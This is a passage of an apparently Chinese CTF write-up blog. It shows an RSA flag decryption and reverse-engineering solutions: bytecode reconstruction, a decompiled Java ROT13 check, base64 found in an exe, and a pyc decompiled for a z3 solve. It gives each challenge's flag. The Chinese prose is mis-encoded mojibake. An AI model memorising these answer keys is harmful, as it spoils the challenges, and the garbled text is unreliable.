class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h3><blockquote><p>reç­¾åˆ°é¢˜ï¼Œæ ¼å¼ï¼šflag{output}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">0: const 60 ; &lt;module &#x27;main&#x27;&gt; </span><br><span class="line">5: module 9 592</span><br><span class="line">11: const 26 ; 83 </span><br><span class="line">16: const 27 ; 69 </span><br><span class="line">21: const 28 ; 65 </span><br><span class="line">26: array 3</span><br><span class="line">31: store 0 0</span><br><span class="line">34: const 30 ; 101 </span><br><span class="line">39: const 31 ; 108 </span><br><span class="line">44: const 32 ; 111 </span><br><span class="line">49: const 33 ; 117 </span><br><span class="line">54: const 34 ; 122 </span><br><span class="line">59: const 30 ; 101 </span><br><span class="line">64: const 35 ; 105 </span><br><span class="line">69: const 36 ; 98 </span><br><span class="line">74: const 30 ; 101 </span><br><span class="line">79: const 31 ; 108 </span><br><span class="line">84: const 33 ; 117 </span><br><span class="line">89: const 35 ; 105 </span><br><span class="line">94: const 37 ; 113 </span><br><span class="line">99: const 33 ; 117 </span><br><span class="line">104: const 35 ; 105 </span><br><span class="line">109: const 37 ; 113 </span><br><span class="line">114: array 16</span><br><span class="line">119: store 0 1</span><br><span class="line">122: const 39 ; 0 </span><br><span class="line">127: store 0 2</span><br><span class="line">130: array 0</span><br><span class="line">135: store 0 3</span><br><span class="line">138: load 0 2</span><br><span class="line">141: const 42 ; 256 </span><br><span class="line">146: lt</span><br><span class="line">147: jz 184</span><br><span class="line">152: load 0 3</span><br><span class="line">155: const 43 ; append </span><br><span class="line">160: getattr</span><br><span class="line">161: load 0 2</span><br><span class="line">164: call 1</span><br><span class="line">166: pop</span><br><span class="line">167: load 0 2</span><br><span class="line">170: const 44 ; 1 </span><br><span class="line">175: add</span><br><span class="line">176: store 0 2</span><br><span class="line">179: jmp 138</span><br><span class="line">184: const 39 ; 0 </span><br><span class="line">189: store 0 4</span><br><span class="line">192: load 0 4</span><br><span class="line">195: const 42 ; 256 </span><br><span class="line">200: lt</span><br><span class="line">201: jz 271</span><br><span class="line">206: load 0 3</span><br><span class="line">209: load 0 4</span><br><span class="line">212: getitem</span><br><span class="line">213: load 0 0</span><br><span class="line">216: load 0 4</span><br><span class="line">219: const 46 ; 3 </span><br><span class="line">224: mod</span><br><span class="line">225: getitem</span><br><span class="line">226: add</span><br><span class="line">227: load 0 1</span><br><span class="line">230: load 0 4</span><br><span class="line">233: const 47 ; 16 </span><br><span class="line">238: mod</span><br><span class="line">239: getitem</span><br><span class="line">240: add</span><br><span class="line">241: const 42 ; 256 </span><br><span class="line">246: mod</span><br><span class="line">247: load 0 3</span><br><span class="line">250: load 0 4</span><br><span class="line">253: setitem</span><br><span class="line">254: load 0 4</span><br><span class="line">257: const 44 ; 1 </span><br><span class="line">262: add</span><br><span class="line">263: store 0 4</span><br><span class="line">266: jmp 192</span><br><span class="line">271: const 39 ; 0 </span><br><span class="line">276: store 0 5</span><br><span class="line">279: load 0 5</span><br><span class="line">282: const 46 ; 3 </span><br><span class="line">287: lt</span><br><span class="line">288: jz 448</span><br><span class="line">293: const 39 ; 0 </span><br><span class="line">298: store 0 6</span><br><span class="line">301: load 0 6</span><br><span class="line">304: const 42 ; 256 </span><br><span class="line">309: lt</span><br><span class="line">310: jz 366</span><br><span class="line">315: load 0 3</span><br><span class="line">318: load 0 6</span><br><span class="line">321: getitem</span><br><span class="line">322: load 0 3</span><br><span class="line">325: load 0 6</span><br><span class="line">328: const 44 ; 1 </span><br><span class="line">333: add</span><br><span class="line">334: const 42 ; 256 </span><br><span class="line">339: mod</span><br><span class="line">340: getitem</span><br><span class="line">341: bxor</span><br><span class="line">342: load 0 3</span><br><span class="line">345: load 0 6</span><br><span class="line">348: setitem</span><br><span class="line">349: load 0 6</span><br><span class="line">352: const 44 ; 1 </span><br><span class="line">357: add</span><br><span class="line">358: store 0 6</span><br><span class="line">361: jmp 301</span><br><span class="line">366: const 39 ; 0 </span><br><span class="line">371: store 0 7</span><br><span class="line">374: load 0 7</span><br><span class="line">377: const 42 ; 256 </span><br><span class="line">382: lt</span><br><span class="line">383: jz 431</span><br><span class="line">388: load 0 3</span><br><span class="line">391: load 0 7</span><br><span class="line">394: getitem</span><br><span class="line">395: const 44 ; 1 </span><br><span class="line">400: add</span><br><span class="line">401: const 42 ; 256 </span><br><span class="line">406: mod</span><br><span class="line">407: load 0 3</span><br><span class="line">410: load 0 7</span><br><span class="line">413: setitem</span><br><span class="line">414: load 0 7</span><br><span class="line">417: const 44 ; 1 </span><br><span class="line">422: add</span><br><span class="line">423: store 0 7</span><br><span class="line">426: jmp 374</span><br><span class="line">431: load 0 5</span><br><span class="line">434: const 44 ; 1 </span><br><span class="line">439: add</span><br><span class="line">440: store 0 5</span><br><span class="line">443: jmp 279</span><br><span class="line">448: const 39 ; 0 </span><br><span class="line">453: store 0 5</span><br><span class="line">456: const 39 ; 0 </span><br><span class="line">461: store 0 8</span><br><span class="line">464: load 0 5</span><br><span class="line">467: const 42 ; 256 </span><br><span class="line">472: lt</span><br><span class="line">473: jz 509</span><br><span class="line">478: load 0 8</span><br><span class="line">481: load 0 3</span><br><span class="line">484: load 0 5</span><br><span class="line">487: getitem</span><br><span class="line">488: add</span><br><span class="line">489: store 0 8</span><br><span class="line">492: load 0 5</span><br><span class="line">495: const 44 ; 1 </span><br><span class="line">500: add</span><br><span class="line">501: store 0 5</span><br><span class="line">504: jmp 464</span><br><span class="line">509: load 0 8</span><br><span class="line">512: const 51 ; 20 </span><br><span class="line">517: mul</span><br><span class="line">518: const 52 ; 5 </span><br><span class="line">523: add</span><br><span class="line">524: store 0 8</span><br><span class="line">527: load 0 8</span><br><span class="line">530: const 54 ; 30 </span><br><span class="line">535: mul</span><br><span class="line">536: const 52 ; 5 </span><br><span class="line">541: sub</span><br><span class="line">542: store 0 8</span><br><span class="line">545: load 0 8</span><br><span class="line">548: const 56 ; 40 </span><br><span class="line">553: mul</span><br><span class="line">554: const 52 ; 5 </span><br><span class="line">559: sub</span><br><span class="line">560: store 0 8</span><br><span class="line">563: load 0 8</span><br><span class="line">566: const 58 ; 50 </span><br><span class="line">571: mul</span><br><span class="line">572: const 59 ; 6645 </span><br><span class="line">577: add</span><br><span class="line">578: store 0 8</span><br><span class="line">581: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">586: load 0 8</span><br><span class="line">589: call 1</span><br><span class="line">591: pop</span><br></pre></td></tr></table></figure></blockquote><p>æ ¹æ®bytecodeè¿˜åŸä»£ç ï¼Œéœ€è¦æ³¨æ„æ•°ç»„çš„å­˜å‚¨é¡ºåºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">83</span>,<span class="number">69</span>,<span class="number">65</span>][::-<span class="number">1</span>]</span><br><span class="line">c = [<span class="number">101</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>][::-<span class="number">1</span>]</span><br><span class="line">S = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S[j] = (S[j]+key[j%<span class="number">3</span>]+c[j%<span class="number">16</span>])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[x] = S[x]^S[(x+<span class="number">1</span>)%<span class="number">256</span>]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[y] = (S[y]+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    b = b+S[k]</span><br><span class="line"></span><br><span class="line">b = b*<span class="number">20</span>+<span class="number">5</span></span><br><span class="line">b = b*<span class="number">30</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">40</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">50</span>+<span class="number">6645</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23075096395</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;23075096395&#125;</code></p><p>â€‹    </p><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><blockquote><p>é¢å¯¹ç–«æƒ…ï¼Œæˆ‘ä»¬çš„å£å·æ˜¯ä»€ä¹ˆï¼Ÿflag{input}</p></blockquote><p>ç”¨jdå·¥å…·åˆ†æjarï¼Œåœ¨Main.classå‘ç°ä¸»ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xaut;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">stringTransformAscii</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">    StringBuffer sbu = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">char</span>[] chars = value.toCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i != chars.length - <span class="number">1</span>) &#123;</span><br><span class="line">        sbu.append(chars[i]).append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sbu.append(chars[i]);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sbu.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">ttk</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">      <span class="keyword">char</span> c = input.charAt(i);</span><br><span class="line">      <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;m&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; </span><br><span class="line">      sb.append(c);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input your keyword);</span></span><br><span class="line"><span class="string">    Scanner scan = new Scanner(System.in);</span></span><br><span class="line"><span class="string">    String str2 = &quot;</span>ddd<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if (scan.hasNextLine())</span></span><br><span class="line"><span class="string">      str2 = scan.nextLine(); </span></span><br><span class="line"><span class="string">    scan.close();</span></span><br><span class="line"><span class="string">    String stringTransformAscii = stringTransformAscii(str2);</span></span><br><span class="line"><span class="string">    String[] offerCodeString = stringTransformAscii.split(&quot;</span>,<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    StringBuffer str5 = new StringBuffer();</span></span><br><span class="line"><span class="string">    for (String s : offerCodeString)</span></span><br><span class="line"><span class="string">      str5.append(s); </span></span><br><span class="line"><span class="string">    int flag = ttk(str2).compareTo(&quot;</span>Jr_j11y_s1tug_g0_raq_g0_raq_pnml<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (flag == 0 &amp;&amp; str5.toString().compareTo(&quot;</span><span class="number">871019511949491089510249103104116951164895101110100951164895101110100959997122121</span><span class="string">&quot;) == 0) &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is correct!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is wrong!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>flagç» <code>ttk()</code> å‡½æ•°å¤„ç†åä¸ <code>Jr_j11y_s1tug_g0_raq_g0_raq_pnml</code> ç›¸åŒï¼Œé€† <code>ttk()</code> æ›¿æ¢å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += k</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We_w11l_f1ght_t0_end_t0_end_cazy</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</code></p><p>â€‹    </p><h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><blockquote><p>æ™®é€šçš„æŸ´çŠ¬ï¼Œæˆ³ä¸€æˆ³ä¼šå‘ç”Ÿä»€ä¹ˆå¥‡å¦™çš„äº‹æƒ…å‘¢ï¼Ÿ</p></blockquote><p>å°†exeç”¨16è¿›åˆ¶å·¥å…·æŸ¥çœ‹ï¼Œæ ¹æ®è¿è¡Œæç¤ºæ–‡å­—æ‰¾åˆ°é™„è¿‘å­˜åœ¨ <code>ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</code>ï¼Œbase64è§£ç å¾—flagï¼š<code>flag&#123;Ch1na_yyds_cazy&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><blockquote><p>åˆæ¬¡è§é¢ï¼Œé€ä¸ªpythoné¢˜ï¼Œç¥æ‚¨æ¥ä¸‹æ¥è§£é¢˜é¡ºåˆ©ï¼Œflag{input}</p></blockquote><p>uncompyle6åç¼–è¯‘pycæ–‡ä»¶å¾—æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [</span><br><span class="line">     <span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="built_in">list</span>(f)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">            flag[j] = <span class="built_in">ord</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">            t1.start()</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag == Happy:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç”¨z3æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 